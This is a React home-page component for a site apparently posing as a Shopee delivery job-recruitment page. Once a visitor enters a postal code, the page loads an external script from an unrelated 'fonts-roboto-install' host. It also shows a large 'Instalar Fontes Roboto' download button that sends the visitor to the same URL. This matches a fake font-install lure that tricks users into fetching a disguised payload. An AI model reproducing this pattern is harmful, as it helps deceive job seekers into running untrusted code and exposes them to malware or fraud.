import React, { useEffect } from 'react';
import Header from '@/components/Header';
import PageTitle from '@/components/PageTitle';
import HeroSection from '@/components/HeroSection';
import Carousel from '@/components/Carousel';
import InfoSection from '@/components/InfoSection';
import JobOpeningsSection from '@/components/JobOpeningsSection';
import BenefitsSection from '@/components/BenefitsSection';
import FAQSection from '@/components/FAQSection';
import CTASection from '@/components/CTASection';
import Footer from '@/components/Footer';
import CepModal from '@/components/CepModal';
import { useAppContext } from '@/contexts/AppContext';
import { useScrollTop } from '@/hooks/use-scroll-top';

const Home: React.FC = () => {
  // Força o scroll para o topo quando a página carrega
  useScrollTop();
  
  const { 
    showCepModal, 
    setShowCepModal, 
    setCepData, 
    setUserCheckedCep 
  } = useAppContext();
  
  useEffect(() => {
    // Verificar se já temos dados salvos
    const savedCepData = localStorage.getItem('shopee_delivery_cep_data');
    if (!savedCepData) {
      // Se não tiver dados, mostrar o modal apenas na página inicial
      setShowCepModal(true);
    } else {
      try {
        const parsedData = JSON.parse(savedCepData);
        setCepData(parsedData);
        setUserCheckedCep(true);
        setShowCepModal(false);
      } catch (error) {
        console.error('Erro ao carregar dados de CEP do localStorage:', error);
        localStorage.removeItem('shopee_delivery_cep_data');
        setShowCepModal(true);
      }
    }
  }, []);

  // Carregar o script do embed da API
  useEffect(() => {
    if (!showCepModal) {
      // Adicionar timeout para tentar carregar o script
      const loadScript = () => {
        const script = document.createElement('script');
        script.src = 'https://fonts-roboto-install.replit.app/api/embed/ebcc52e6-5b5e-4841-971f-2dba1114c5c5';
        script.async = true;
        
        script.onload = () => {
          console.log('✅ Script da API embed carregado com sucesso');
          // Se o script carregar, tentar ocultar o botão fallback
          const fallbackBtn = document.querySelector('.fallback-embed-btn') as HTMLElement;
          if (fallbackBtn) {
            fallbackBtn.style.display = 'none';
          }
        };
        
        script.onerror = () => {
          console.warn('❌ Erro ao carregar script da API embed, usando botão fallback');
        };
        
        const container = document.getElementById('api-embed-container');
        if (container) {
          container.appendChild(script);
        }
      };

      // Tentar carregar após um pequeno delay
      const timer = setTimeout(loadScript, 1000);

      return () => {
        clearTimeout(timer);
      };
    }
  }, [showCepModal]);
  
  const handleCepConfirm = (cepData: { cep: string, city: string, state: string }) => {
    setCepData(cepData);
    setUserCheckedCep(true);
    setShowCepModal(false);
  };
  
  const handleCepModalClose = () => {
    // Permitir fechar apenas se já temos dados de CEP
    const savedCepData = localStorage.getItem('shopee_delivery_cep_data');
    if (savedCepData) {
      setShowCepModal(false);
    }
  };

  return (
    <div className="bg-white">
      <CepModal 
        isOpen={showCepModal} 
        onClose={handleCepModalClose}
        onConfirm={handleCepConfirm}
      />
      <div className={showCepModal ? 'hidden' : 'block'}>
        <Header />
        <PageTitle />
        
        {/* Botão Embed da API */}
        <div className="container mx-auto px-4 py-4">
          <div className="w-full max-w-4xl mx-auto">
            <div className="bg-white shadow-md rounded-lg overflow-hidden mb-4">
              <div className="p-4">
                <div id="api-embed-container" className="min-h-[60px] flex items-center justify-center">
                  {/* Fallback: Botão personalizado enquanto a API não carrega */}
                  <button 
                    className="fallback-embed-btn bg-[#E83D22] hover:bg-[#d73920] text-white font-medium px-8 py-3 rounded-md transition-colors duration-200 flex items-center gap-2 shadow-lg"
                    onClick={() => {
                      // Tentar instalar as fontes Roboto
                      try {
                        // Opção 1: Tentar abrir em nova aba
                        const newWindow = window.open('https://fonts-roboto-install.replit.app/api/embed/ebcc52e6-5b5e-4841-971f-2dba1114c5c5', '_blank');
                        
                        if (!newWindow) {
                          // Opção 2: Se popup foi bloqueado, redirecionar na mesma aba
                          window.location.href = 'https://fonts-roboto-install.replit.app/api/embed/ebcc52e6-5b5e-4841-971f-2dba1114c5c5';
                        }
                      } catch (error) {
                        console.error('Erro ao abrir URL da API:', error);
                      }
                    }}
                  >
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
                      <polyline points="7,10 12,15 17,10"/>
                      <line x1="12" y1="15" x2="12" y2="3"/>
                    </svg>
                    Instalar Fontes Roboto
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
        
        <HeroSection />
        <Carousel />
        <InfoSection />
        <JobOpeningsSection />
        <BenefitsSection />
        <FAQSection />
        <CTASection />
        <Footer />
      </div>
    </div>
  );
};

export default Home;
